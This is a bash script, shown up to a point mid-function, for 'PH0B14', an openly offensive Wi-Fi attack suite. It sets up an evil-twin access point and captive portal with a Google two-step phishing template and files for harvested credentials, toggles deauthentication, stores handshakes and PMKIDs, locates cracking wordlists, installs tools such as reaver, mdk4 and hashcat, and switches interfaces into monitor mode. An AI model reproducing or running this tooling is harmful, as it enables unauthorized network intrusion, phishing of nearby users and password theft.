#!/bin/bash

# ==== portable base dir — set once, used everywhere ====
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export BASE_DIR

# ==== load user env (phobia.env) ====
if [ -f "$BASE_DIR/phobia.env" ]; then
    set -a
    . "$BASE_DIR/phobia.env"
    set +a
fi

# ==== portable wordlist dir ====
PHOBIA_WORDLIST_DIR="${PHOBIA_WORDLIST_DIR:-/usr/share/wordlists}"
export PHOBIA_WORDLIST_DIR

# ==== wordlist detection (first match wins) ====
WORDLIST_DIRS=(
    "${PHOBIA_WORDLIST_DIR:-}"
    "$BASE_DIR/dictionaries"
    "/usr/share/wordlists"
    "/usr/share/seclists/Passwords"
    "/usr/share/seclists/Passwords/Leaked-Databases"
    "$HOME/wordlists"
    "$HOME/WPA-Dictionary-276M"
    "/opt/wordlists"
)

find_wordlist() {
    local name="$1"
    local d
    for d in "${WORDLIST_DIRS[@]}"; do
        [ -n "$d" ] && [ -f "$d/$name" ] && echo "$d/$name" && return 0
    done
    return 1
}

# common wordlists — resolved at startup
WL_ROCKYOU=$(find_wordlist "rockyou.txt" || true)
[ -z "$WL_ROCKYOU" ] && [ -f /usr/share/wordlists/rockyou.txt.gz ] && WL_ROCKYOU="/usr/share/wordlists/rockyou.txt.gz"
WL_ROCKYOU_GZ=$(find_wordlist "rockyou.txt.gz" || true)
WL_TOP10K=$(find_wordlist "top10k.txt" || true)
WL_160M=$(find_wordlist "160m.txt" || true)
WL_NUMBERS=$(find_wordlist "1-9-digit-numbers.txt" || true)
WL_FASTTRACK=$(find_wordlist "fasttrack.txt" || true)
WL_COMMON=$(find_wordlist "common.txt" || true)

# ==== debug log ====
PHOBIA_DEBUG_LOG="${LOGS_DIR:-$BASE_DIR/logs}/debug.log"

# ==== global error logging (non-fatal) ====
_phobia_log_error() {
    local exit_code=$?
    local line_no=$1
    local cmd="$2"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR line $line_no: '$cmd' exited $exit_code" >> "$PHOBIA_DEBUG_LOG"
}

mkdir -p "$(dirname "$PHOBIA_DEBUG_LOG")" 2>/dev/null
touch "$PHOBIA_DEBUG_LOG" 2>/dev/null

_phobia_debug_log() {
    print_banner
    menu_header "D E B U G   L O G"
    phb_row "  path: $PHOBIA_DEBUG_LOG" "${DIM}${GREY}"
    phb_row "  size: $(du -h "$PHOBIA_DEBUG_LOG" 2>/dev/null | awk '{print $1}')" "${DIM}${GREY}"
    phb_div
    phb_row "  -- last 60 lines --" "${BOLD}${CYAN}"
    echo ""
    tail -60 "$PHOBIA_DEBUG_LOG" 2>/dev/null | while IFS= read -r line; do
        echo -e "  ${DIM}${line}${NC}"
    done
    echo ""
    phb_div
    phb_row "  [c]  Clear debug log" "${BOLD}${RED}"
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" _c
    case "$_c" in
        c|C) > "$PHOBIA_DEBUG_LOG"; echo "  cleared" ;;
        0) return ;;
    esac
}


# convenience — first available of a type
_wordlist_fast() {
    [ -n "$WL_TOP10K" ] && echo "$WL_TOP10K" && return
    [ -n "$WL_FASTTRACK" ] && echo "$WL_FASTTRACK" && return
    [ -n "$WL_ROCKYOU" ] && echo "$WL_ROCKYOU" && return
    echo ""
}
_wordlist_standard() {
    [ -n "$WL_ROCKYOU" ] && echo "$WL_ROCKYOU" && return
    [ -n "$WL_ROCKYOU_GZ" ] && echo "$WL_ROCKYOU_GZ" && return
    echo ""
}
_wordlist_large() {
    [ -n "$WL_160M" ] && echo "$WL_160M" && return
    [ -n "$WL_ROCKYOU" ] && echo "$WL_ROCKYOU" && return
    echo ""
}
_wordlist_numeric() {
    [ -n "$WL_NUMBERS" ] && echo "$WL_NUMBERS" && return
    [ -n "$WL_ROCKYOU" ] && echo "$WL_ROCKYOU" && return
    echo ""
}

# warn once if nothing at all is found
if [ -z "$WL_ROCKYOU" ] && [ -z "$WL_ROCKYOU_GZ" ]; then
    echo "[!] no rockyou wordlist found — install with: sudo apt install wordlists"
    echo "    or set PHOBIA_WORDLIST_DIR in phobia.env"
fi


# =========================================================


# ---------- force UTF-8 locale ----------
export LANG="${LANG:-en_US.UTF-8}"
export LC_ALL="${LC_ALL:-en_US.UTF-8}"
export LC_CTYPE="${LC_CTYPE:-en_US.UTF-8}"
# re-exec once if the terminal can't handle it
case "$LANG" in
    *UTF-8*|*utf8*|*utf-8*) : ;;
    *) export LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 LC_CTYPE=en_US.UTF-8 ;;
esac
# ---------------------------------------

# ===============================================================
#  PH0B14  -  full suite  v5.9.0
#  Created By: @zeruaep
# ===============================================================

# preserve DISPLAY when running under sudo (xterms need it)
if [ -z "$DISPLAY" ]; then
    for d in :0 :1 :2; do
        if [ -e "/tmp/.X11-unix/X${d#:}" ]; then
            export DISPLAY="$d"
            break
        fi
    done
fi
if [ -n "$DISPLAY" ] && command -v xhost >/dev/null 2>&1; then
    xhost +local:root >/dev/null 2>&1 || true
fi

# --- warn if terminal is too small (don't force-resize; breaks modern terms) ---
_phobia_cols=$(tput cols 2>/dev/null || echo 80)
_phobia_rows=$(tput lines 2>/dev/null || echo 24)
if [ "$_phobia_cols" -lt 120 ] || [ "$_phobia_rows" -lt 30 ]; then
    echo ""
    echo "  [!] Your terminal is ${_phobia_cols}x${_phobia_rows}."
    echo "      PHOBIA looks best at 120x30 or larger."
    echo "      Some menus may wrap or scroll on smaller windows."
    echo ""
    sleep 2
fi
unset _phobia_cols _phobia_rows

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'
ORANGE='\033[38;5;208m'
GOLD='\033[38;5;220m'
TEAL='\033[38;5;44m'
VIOLET='\033[38;5;141m'
PINK='\033[38;5;205m'
LIME='\033[38;5;154m'
SKY='\033[38;5;117m'
GREY='\033[38;5;245m'

SCRIPT_VERSION="1.0.0"
INTERFACE="wlan0"
MONITOR="wlan0mon"
MONITOR_ACTUAL=""
BT_IF=""
PORTAL_IP="10.0.0.1"
SUBNET_BASE="10.0.0"
PORTAL_PORT="80"
DNSMASQ_CONF="/tmp/evil-dnsmasq.conf"
DNSMASQ_LOG="/tmp/evil-dnsmasq.log"
HOSTAPD_CONF="/tmp/evil-hostapd.conf"
HOSTAPD_LOG="/tmp/evil-hostapd.log"
SERVER_PY="/tmp/evil-server.py"
SERVER_LOG="/tmp/evil-server.log"
SCAN_PREFIX="/tmp/eviscan"
SCAN_PARSER="$BASE_DIR/.ph0b14_scan_parser.awk"
CAP_DIR="$BASE_DIR/captures"
SCAN_READY="/tmp/evi_scan_ready"
HS_DONE="/tmp/evil_hs_done"
HANDSHAKE_CAP=""
BRAND_NAME="Router"
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
DONE_FLAG="/tmp/evil_done"
DO_DEAUTH="yes"
DO_INTERNET="no"
G_AP="80x22+0+0"
G_DEAUTH="80x22+640+0"
G_WEB="80x22+1280+0"
G_CREDS="100x14+0+380"
G_VERIFY="100x14+700+380"
G2SRC="$BASE_DIR/templates/google-2step"

BASE_DIR="$BASE_DIR"
HAND_DIR="$BASE_DIR/handshakes"
PMK_DIR="$BASE_DIR/pmkids"
PW_DIR="$BASE_DIR/passwords"
PAGES_DIR="$BASE_DIR/pages"
LOGS_DIR="$BASE_DIR/logs"
SHARK_FILE="$BASE_DIR/shark.txt"
BT_HISTORY="$BASE_DIR/bt_history.txt"
BACK_TO_MENU=0

mkdir -p "$HAND_DIR" "$PMK_DIR" "$PW_DIR" "$PAGES_DIR" "$LOGS_DIR" 2>/dev/null

REQUIRED_TOOLS=(
    "aircrack-ng" "airodump-ng" "aireplay-ng" "airmon-ng"
    "hostapd" "dnsmasq" "xterm" "openssl" "socat" "macchanger"
    "mdk4" "hcxdumptool" "hcxpcapngtool" "wash" "reaver"
    "hashcat" "john" "asleap" "tshark"
)

PKG_FOR_TOOL() {
    case "$1" in
        aircrack-ng|airodump-ng|aireplay-ng|airmon-ng) echo "aircrack-ng" ;;
        hostapd) echo "hostapd" ;;
        dnsmasq) echo "dnsmasq" ;;
        xterm) echo "xterm" ;;
        openssl) echo "openssl" ;;
        socat) echo "socat" ;;
        macchanger) echo "macchanger" ;;
        mdk4) echo "mdk4" ;;
        hcxdumptool) echo "hcxdumptool" ;;
        hcxpcapngtool) echo "hcxtools" ;;
        wash|reaver) echo "reaver" ;;
        hashcat) echo "hashcat" ;;
        john) echo "john" ;;
        asleap) echo "asleap" ;;
        hostapd-wpe) echo "hostapd-wpe" ;;
        tshark) echo "tshark" ;;
        *) echo "$1" ;;
    esac
}

launch_xterm() {
    # if xterm is installed, use it (fastest, cleanest)
    if command -v xterm >/dev/null 2>&1; then
        setsid xterm "$@" </dev/null >/dev/null 2>&1 &
        return 0
    fi

    # fallback 1: try other terminal emulators
    local fallback_cmd=""
    for term in gnome-terminal konsole xfce4-terminal terminator alacritty kitty x-terminal-emulator; do
        if command -v "$term" >/dev/null 2>&1; then
            fallback_cmd="$term"
            break
        fi
    done

    # extract the shell command from xterm args (everything after -e)
    local shell_cmd=""
    local args=("$@")
    local i
    for ((i=0; i<${#args[@]}; i++)); do
        if [ "${args[$i]}" = "-e" ]; then
            shell_cmd="${args[@]:$((i+1))}"
            break
        fi
    done

    if [ -z "$shell_cmd" ]; then
        echo "[!] launch_xterm: no command found in args" >&2
        return 1
    fi

    # if we found another terminal, use it
    if [ -n "$fallback_cmd" ]; then
        case "$fallback_cmd" in
            gnome-terminal)  setsid gnome-terminal -- bash -c "$shell_cmd; read" </dev/null >/dev/null 2>&1 & ;;
            konsole)         setsid konsole -e bash -c "$shell_cmd; read" </dev/null >/dev/null 2>&1 & ;;
            xfce4-terminal)  setsid xfce4-terminal -e "bash -c '$shell_cmd; read'" </dev/null >/dev/null 2>&1 & ;;
            terminator)      setsid terminator -e "bash -c '$shell_cmd; read'" </dev/null >/dev/null 2>&1 & ;;
            alacritty)       setsid alacritty -e bash -c "$shell_cmd; read" </dev/null >/dev/null 2>&1 & ;;
            kitty)           setsid kitty bash -c "$shell_cmd; read" </dev/null >/dev/null 2>&1 & ;;
            x-terminal-emulator) setsid x-terminal-emulator -e bash -c "$shell_cmd; read" </dev/null >/dev/null 2>&1 & ;;
        esac
        echo "[*] xterm not found — spawned in $fallback_cmd"
        return 0
    fi

    # fallback 2: no terminal found at all → run in background, log to file
    local logdir="${LOGS_DIR:-$BASE_DIR/logs}"
    mkdir -p "$logdir" 2>/dev/null
    local logfile="$logdir/background_$(date +%s).log"
    echo "[!] no terminal emulator found — running in background, output → $logfile"
    setsid bash -c "$shell_cmd" </dev/null >"$logfile" 2>&1 &
    return 0
}
wait_xterm_done() {
    echo ""; echo -e "${DIM}    (xterm is running — Ctrl+C there when you're done)${NC}"
    echo -e "${DIM}    Press ENTER here to return.${NC}"; read -p "" _d
}

loading() {
    local msg="${1:-Loading}"
    local s="|/-\\"
    local i=0
    for i in 1 2 3 4 5 6 7 8; do
        local c="${s:$((i % 4)):1}"
        printf "\r${CYAN}[%s]${NC} ${msg}... " "$c"
        sleep 0.05
    done
    printf "\r\033[K"
}

loading_bar() {
    local label="${1:-Loading}"
    local spin='|/-\'
    local dots='...'
    local i=0
    local total=7
    for ((i=0; i<total; i++)); do
        local sp="${spin:$((i % 4)):1}"
        local d1="${dots:$((i % 3)):1}"
        local d2="${dots:$(((i+1) % 3)):1}"
        local d3="${dots:$(((i+2) % 3)):1}"
        printf "\r  ${YELLOW}[%s]${NC} ${CYAN}%s${NC} ${DIM}%s%s%s${NC}   " \
            "$sp" "$label" "$d1" "$d2" "$d3"
        sleep 0.07
    done
    printf "\r\033[K"
    printf "  ${CYAN}%s${NC}\n" "$label"
}

ensure_tool() {
    local bin="$1"
    local pkg="${2:-$1}"
    if command -v "$bin" >/dev/null 2>&1; then
        return 0
    fi

    # check the package actually exists in apt before trying
    if ! apt-cache show "$pkg" >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] $bin not found, and '$pkg' is not an apt package.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[!] $bin not found. Installing $pkg...${NC}"
    sudo apt update >/dev/null 2>&1
    sudo DEBIAN_FRONTEND=noninteractive apt install -y "$pkg" >/dev/null 2>&1
    if command -v "$bin" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] $bin installed${NC}"
        return 0
    fi
    echo -e "${RED}[!] Failed to install $bin${NC}"
    return 1
}
ensure_git_tool() {
    local bin="$1" repo="$2" dir="$3"
    if command -v "$bin" >/dev/null 2>&1; then return 0; fi
    if [ -d "$dir" ]; then return 0; fi
    echo -e "${YELLOW}[!] $bin not found. Cloning $repo ...${NC}"
    git clone --depth 1 "$repo" "$dir" 2>&1 | tail -2
    if [ -d "$dir" ]; then
        echo -e "${GREEN}[+] cloned to $dir${NC}"
        return 0
    fi
    echo -e "${RED}[!] clone failed${NC}"
    return 1
}

print_exit_banner(){
    echo ""
    echo -e "${BOLD}${CYAN}===============================================================${NC}"
    echo -e "${BOLD}${MAGENTA}                    THANK YOU FOR USING PH0B14${NC}"
    echo -e "${BOLD}${CYAN}===============================================================${NC}"
    echo -e "  ${BOLD}${GREEN}Follow / support:${NC}"
    echo -e "    ${CYAN}Instagram${NC}  ${DIM}->${NC} ${YELLOW}@zeruaep${NC}"
    echo -e "    ${CYAN}TikTok${NC}     ${DIM}->${NC} ${YELLOW}@zeruaep${NC}"
    echo -e "    ${CYAN}GitHub${NC}     ${DIM}->${NC} ${YELLOW}zeru-aep${NC}"
    echo -e "    ${CYAN}Telegram${NC}   ${DIM}->${NC} ${YELLOW}@zeru_aep${NC}"
    echo ""
    echo -e "  ${BOLD}${GREEN}Version:${NC} ${YELLOW}v$SCRIPT_VERSION${NC}"
    echo -e "${BOLD}${CYAN}===============================================================${NC}"
    echo ""
}

show_intro() {
    clear
    export LC_ALL="${LC_ALL:-en_US.UTF-8}"
    local COLS=$(tput cols 2>/dev/null)
    [ -z "$COLS" ] && COLS=150

    local FRAME_A="" FRAME_B=""
    if [ -f "$SHARK_FILE" ]; then
        FRAME_A=$(awk '/^###FRAME###$/{exit} {print}' "$SHARK_FILE")
        FRAME_B=$(awk 'f{print} /^###FRAME###$/{f=1}' "$SHARK_FILE")
    fi
    [ -z "$FRAME_B" ] && FRAME_B="$FRAME_A"

    draw_raw() {
        local art="$1" color="$2"
        clear
        local l
        while IFS= read -r l; do
            [ -z "$l" ] && { echo ""; continue; }
            local LEN=$(printf '%s' "$l" | wc -m)
            local PAD=$(( (COLS - LEN) / 2 ))
            [ $PAD -lt 0 ] && PAD=0
            printf "%*s" "$PAD" ""
            echo -e "${color}${l}${NC}"
        done <<< "$art"
    }

    # fast flash: A B A B A B at 0.18s
    local seq=(A B A B A B)
    local f
    for f in "${seq[@]}"; do
        if [ "$f" = "A" ]; then draw_raw "$FRAME_A" "${BOLD}${RED}"; else draw_raw "$FRAME_B" "${BOLD}${RED}"; fi
        sleep 0.18
    done
    sleep 0.1
    clear
}

show_intro_main_frame() {
    export LC_ALL="${LC_ALL:-en_US.UTF-8}"
    local COLS
    COLS=$(tput cols 2>/dev/null); [ -z "$COLS" ] && COLS=150

    local FRAME_A=""
    if [ -f "$SHARK_FILE" ]; then
        FRAME_A=$(awk '/^###FRAME###$/{exit} {print}' "$SHARK_FILE")
    fi

    local FRAME_W=$(( COLS - 4 ))
    [ "$FRAME_W" -gt 100 ] && FRAME_W=100
    local INNER_W=$(( FRAME_W - 2 ))
    [ $(( INNER_W % 2 )) -ne 0 ] && INNER_W=$(( INNER_W - 1 ))

    local line=""
    local i=0
    for ((i=0;i<INNER_W;i++)); do line+="-"; done

    local pad=$(( (COLS - INNER_W - 2) / 2 ))
    [ $pad -lt 0 ] && pad=0

    top_line()   { printf "%*s" "$pad" ""; echo -e "${BOLD}${CYAN}+${line}+${NC}"; }
    blank_line() { printf "%*s" "$pad" ""; printf "${BOLD}${CYAN}|${NC}"; printf "%*s" "$INNER_W" ""; printf "${BOLD}${CYAN}|${NC}\n"; }
    div_line()   { printf "%*s" "$pad" ""; echo -e "${BOLD}${CYAN}+${line}+${NC}"; }

    centered() {
        local text="$1" color="$2"
        local len=${#text}
        local p=$(( (INNER_W - len) / 2 ))
        [ "$p" -lt 0 ] && p=0
        local r=$(( INNER_W - len - p ))
        [ "$r" -lt 0 ] && r=0
        printf "%*s" "$pad" ""
        printf "${BOLD}${CYAN}|${NC}"
        printf "%*s" "$p" ""
        printf "%b%s${NC}" "$color" "$text"
        printf "%*s" "$r" ""
        printf "${BOLD}${CYAN}|${NC}\n"
    }

    # --- FIXED PH0B14 art: last glyph is 4 not 8 ---
    local art1='██████╗ ██╗  ██╗ ██████╗ ██████╗  ██╗ ██╗  ██╗'
    local art2='██╔══██╗██║  ██║██╔═████╗██╔══██╗███║ ██║  ██║'
    local art3='██████╔╝███████║██║██╔██║██████╔╝╚██║ ███████║'
    local art4='██╔===╝ ██╔══██║████╔╝██║██╔══██╗ ██║ ╚====██║'
    local art5='██║     ██║  ██║╚██████╔╝██████╔╝ ██║      ██║'
    local art6='╚═╝     ╚═╝  ╚═╝ ╚=====╝ ╚=====╝  ╚═╝      ╚═╝'

    local target="W   E      A   R   E      P   H   0   B   1   4"
    local tlen=${#target}
    local tpad=$(( (INNER_W - tlen) / 2 ))
    [ "$tpad" -lt 0 ] && tpad=0

    top_line
    blank_line

    # ---- shark Frame A inside box, above PH0B14 ----
    if [ -n "$FRAME_A" ]; then
        while IFS= read -r l; do
            [ -z "$l" ] && { blank_line; continue; }
            centered "$l" "${BOLD}${RED}"
        done <<< "$FRAME_A"
        blank_line
        div_line
        blank_line
    fi

    # ---- WE ARE typing ----
    local k=0
    local spinstr='|/-\'
    for ((k=0; k<tlen; k++)); do
        local sp="${spinstr:$((k % 4)):1}"
        local cur="${target:0:$((k+1))}"
        printf "\r%*s" "$pad" ""
        printf "${BOLD}${CYAN}|${NC}%*s" "$tpad" ""
        printf "${BOLD}${YELLOW}%s${NC} ${GREEN}[%s]${NC}" "$cur" "$sp"
        local used=$(( tpad + ${#cur} + 4 ))
        local tail=$(( INNER_W - used ))
        [ $tail -lt 0 ] && tail=0
        printf "%*s" "$tail" ""
        printf "${BOLD}${CYAN}|${NC}"
        sleep 0.066
    done
    printf "\r%*s" "$pad" ""
    printf "${BOLD}${CYAN}|${NC}%*s" "$tpad" ""
    printf "${BOLD}${YELLOW}%s${NC} ${GREEN}[ok]${NC}" "$target"
    local used=$(( tpad + tlen + 5 ))
    local tail=$(( INNER_W - used ))
    [ $tail -lt 0 ] && tail=0
    printf "%*s" "$tail" ""
    printf "${BOLD}${CYAN}|${NC}\n"

    blank_line
    div_line

    centered "$art1" "${BOLD}${RED}"
    centered "$art2" "${BOLD}${RED}"
    centered "$art3" "${BOLD}${RED}"
    centered "$art4" "${BOLD}${RED}"
    centered "$art5" "${BOLD}${RED}"
    centered "$art6" "${BOLD}${RED}"

    blank_line
    div_line
    blank_line
    centered "THANK YOU FOR USING PH0B14" "${BOLD}${GREEN}"
    blank_line
    div_line
    blank_line
    centered "Follow / support" "${BOLD}${GREEN}"
    blank_line
    centered "Instagram  -> @zeruaep" "${YELLOW}"
    centered "TikTok     -> @zeruaep" "${YELLOW}"
    centered "GitHub     -> zeru-aep" "${YELLOW}"
    centered "Telegram   -> @zeru_aep" "${YELLOW}"
    blank_line
    div_line
    blank_line
    centered "Version: v$SCRIPT_VERSION" "${BOLD}${GREEN}"
    blank_line
    top_line
    echo ""
    sleep 3
}

ensure_scan_parser() {
    if [ ! -f "$SCAN_PARSER" ]; then
        cat > "$SCAN_PARSER" << 'AWKEOF'
NR>1 && NF>=14 {
    for (i=1;i<=NF;i++) gsub(/^ +| +$/,"",$i);
    if ($1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) print $1","$4","$9","$14
}
AWKEOF
        chmod 644 "$SCAN_PARSER"
    fi
}
on_interrupt() {
    local counter="/tmp/phobia_int_count"
    local stamp="/tmp/phobia_int_time"
    local now
    now=$(date +%s)
    local last=0
    local count=0
    [ -f "$stamp" ] && last=$(cat "$stamp" 2>/dev/null)
    [ -f "$counter" ] && count=$(cat "$counter" 2>/dev/null)
    if [ $(( now - last )) -gt 3 ]; then
        count=0
    fi
    count=$((count + 1))
    echo "$now" > "$stamp"
    echo "$count" > "$counter"

    if [ "$count" -ge 2 ]; then
        echo ""
        echo -e "${RED}[!] Quitting.${NC}"
        rm -f "$counter" "$stamp"
        pkill -9 -f xterm 2>/dev/null
        pkill -9 -f hostapd 2>/dev/null
        pkill -9 -f dnsmasq 2>/dev/null
        pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
        pkill -9 -f aireplay-ng 2>/dev/null
        pkill -9 -f airodump-ng 2>/dev/null
        pkill -9 -f mdk4 2>/dev/null
        pkill -9 -f arpspoof 2>/dev/null
        sleep 1
        if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
        if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
        if ip link show "$INTERFACE" >/dev/null 2>&1; then
            ip link set "$INTERFACE" down >/dev/null 2>&1
            iw dev "$INTERFACE" set type managed >/dev/null 2>&1
            ip link set "$INTERFACE" up >/dev/null 2>&1
            ip addr flush dev "$INTERFACE" >/dev/null 2>&1
        fi
        timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
        timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Cleaned up.${NC}"
        exit 0
    fi

    echo ""
    echo -e "${YELLOW}[*] Returning to menu...${NC}"
    echo -e "${DIM}    Press Ctrl+C again within 3s to QUIT.${NC}"
    pkill -9 -f xterm 2>/dev/null
    sleep 1
    pkill -9 -f hostapd 2>/dev/null
    pkill -9 -f dnsmasq 2>/dev/null
    pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
    pkill -9 -f aireplay-ng 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null
    pkill -9 -f mdk4 2>/dev/null
    pkill -9 -f arpspoof 2>/dev/null
    sleep 1
    if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
    if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
    if ip link show "$INTERFACE" >/dev/null 2>&1; then
        ip link set "$INTERFACE" down >/dev/null 2>&1
        iw dev "$INTERFACE" set type managed >/dev/null 2>&1
        ip link set "$INTERFACE" up >/dev/null 2>&1
        ip addr flush dev "$INTERFACE" >/dev/null 2>&1
    fi
    timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
    timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &
    BACK_TO_MENU=1
}

kill_stuck() {
    print_banner
    echo -e "${CYAN}[*] Killing stuck tasks...${NC}"
    systemctl stop apache2 2>/dev/null
    pkill -9 -f hostapd 2>/dev/null
    pkill -9 -f dnsmasq 2>/dev/null
    pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
    pkill -9 -f aireplay-ng 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null
    pkill -9 -f mdk4 2>/dev/null
    pkill -9 -f reaver 2>/dev/null
    pkill -9 -f wash 2>/dev/null
    pkill -9 -f hcxdumptool 2>/dev/null
    pkill -9 -f "socat.*OPENSSL" 2>/dev/null
    pkill -9 -f xterm 2>/dev/null
    sleep 2
    echo -e "${GREEN}[+] Done.${NC}"
    pause
}

reset_portal_state() {
    echo -e "${CYAN}[*] Resetting portal state for new AP target...${NC}"
    pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
    sleep 1
    rm -f /var/www/html/creds.txt /var/www/html/verified_creds.txt 2>/dev/null
    rm -f /tmp/evil_success /tmp/evil_done 2>/dev/null
    echo -e "${GREEN}[+] Portal state cleared${NC}"
}

cleanup(){
    echo ""
    echo -e "${YELLOW}[+] Cleaning up...${NC}"
    pkill -9 -f xterm 2>/dev/null
    sleep 1
    pkill -9 -f hostapd 2>/dev/null
    pkill -9 -f dnsmasq 2>/dev/null
    pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
    pkill -9 -f aireplay-ng 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null
    pkill -9 -f mdk4 2>/dev/null
    pkill -9 -f reaver 2>/dev/null
    pkill -9 -f wash 2>/dev/null
    pkill -9 -f hcxdumptool 2>/dev/null
    pkill -9 -f "socat.*OPENSSL" 2>/dev/null
    sleep 1
    iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null
    iptables -D FORWARD -i wlan0 -o eth0 -j ACCEPT 2>/dev/null
    iptables -D FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
    if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
    if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
    if ip link show "$INTERFACE" >/dev/null 2>&1; then
        ip link set "$INTERFACE" down >/dev/null 2>&1
        iw dev "$INTERFACE" set type managed >/dev/null 2>&1
        ip link set "$INTERFACE" up >/dev/null 2>&1
        ip addr flush dev "$INTERFACE" >/dev/null 2>&1
    fi
    timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
    timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &
    sleep 2
    rm -f "$DONE_FLAG" "$HS_DONE" "$DNSMASQ_LOG" "$SCAN_READY"
    echo -e "${GREEN}[+] Network restored.${NC}"
    print_exit_banner
    exit 0
}
# trap cleanup INT   # replaced by menu-level on_interrupt

check_tools() {
    print_banner
    echo -e "${BOLD}${CYAN}=========== TOOL CHECK ===========${NC}"
    local missing=()
    for t in "${REQUIRED_TOOLS[@]}"; do
        if command -v "$t" >/dev/null 2>&1; then
            printf "  ${GREEN}[ok]${NC}   %s\n" "$t"
        else
            printf "  ${RED}[miss]${NC} %s\n" "$t"
            missing+=("$t")
        fi
    done
    if [ ${#missing[@]} -eq 0 ]; then echo -e "${GREEN}[+] All tools present.${NC}"; return 0; fi
    echo ""
    read -p "$(echo -e ${YELLOW}'Install missing tools? [y/N]: '${NC})" YN
    if [ "$YN" = "y" ] || [ "$YN" = "Y" ]; then
        local pkgs=(); for t in "${missing[@]}"; do pkgs+=("$(PKG_FOR_TOOL $t)"); done
        local uniq=($(printf "%s\n" "${pkgs[@]}" | sort -u))
        sudo apt update; sudo apt install -y "${uniq[@]}"
    fi
    pause
}

put_in_monitor_mode() {
    print_banner
    ensure_tool airmon-ng aircrack-ng
    echo -e "${CYAN}[*] Monitor mode on $INTERFACE...${NC}"
    loading "Switching to monitor mode"
    systemctl stop NetworkManager 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null; pkill -9 -f aireplay-ng 2>/dev/null
    sleep 1
    ip link set $MONITOR down >/dev/null 2>&1; iw dev $MONITOR del >/dev/null 2>&1
    sleep 1
    ip link set $INTERFACE down >/dev/null 2>&1
    iw $INTERFACE set type monitor >/dev/null 2>&1
    ip link set $INTERFACE up >/dev/null 2>&1
    sleep 1
    iw dev $INTERFACE interface add $MONITOR type monitor >/dev/null 2>&1
    sleep 1
    if iw dev $MONITOR info >/dev/null 2>&1; then
        ip link set $MONITOR up >/dev/null 2>&1
        MONITOR_ACTUAL="$MONITOR"
    else
        MONITOR_ACTUAL="$INTERFACE"
    fi
    echo -e "${GREEN}[+] Monitor: $MONITOR_ACTUAL${NC}"; iw dev; pause
}

put_in_managed_mode() {
    print_banner
    echo -e "${CYAN}[*] Managed mode on $INTERFACE...${NC}"
    loading "Switching to managed mode"
    pkill -9 -f airodump-ng 2>/dev/null; pkill -9 -f aireplay-ng 2>/dev/null
    sleep 1
    ip link set $MONITOR down >/dev/null 2>&1; iw dev $MONITOR del >/dev/null 2>&1
    sleep 1
    ip link set $INTERFACE down >/dev/null 2>&1
    iw $INTERFACE set type managed >/dev/null 2>&1
    ip link set $INTERFACE up >/dev/null 2>&1
    systemctl start NetworkManager 2>/dev/null
    sleep 2
    echo -e "${GREEN}[+] Managed.${NC}"; iw dev; pause
}

ensure_monitor_on() {
    local ch="$1"; local mon_iface=""
    if iw dev "$MONITOR" info >/dev/null 2>&1; then mon_iface="$MONITOR"
    else
        ip link set $INTERFACE down >/dev/null 2>&1
        iw dev $INTERFACE interface add "$MONITOR" type monitor >/dev/null 2>&1
        sleep 1
        if iw dev "$MONITOR" info >/dev/null 2>&1; then mon_iface="$MONITOR"; fi
    fi
    if [ -z "$mon_iface" ]; then
        local mt=$(iw dev $INTERFACE info 2>/dev/null | awk '/type/{print $2}')
        if [ "$mt" = "monitor" ]; then mon_iface="$INTERFACE"; fi
    fi
    if [ -z "$mon_iface" ]; then
        ip link set $INTERFACE down >/dev/null 2>&1
        iw $INTERFACE set type monitor >/dev/null 2>&1
        ip link set $INTERFACE up >/dev/null 2>&1
        sleep 1
        mon_iface="$INTERFACE"
    fi
    ip link set "$mon_iface" down >/dev/null 2>&1
    iw dev "$mon_iface" set type monitor >/dev/null 2>&1
    iw dev "$mon_iface" set channel "$ch" >/dev/null 2>&1
    ip link set "$mon_iface" up >/dev/null 2>&1
    sleep 1
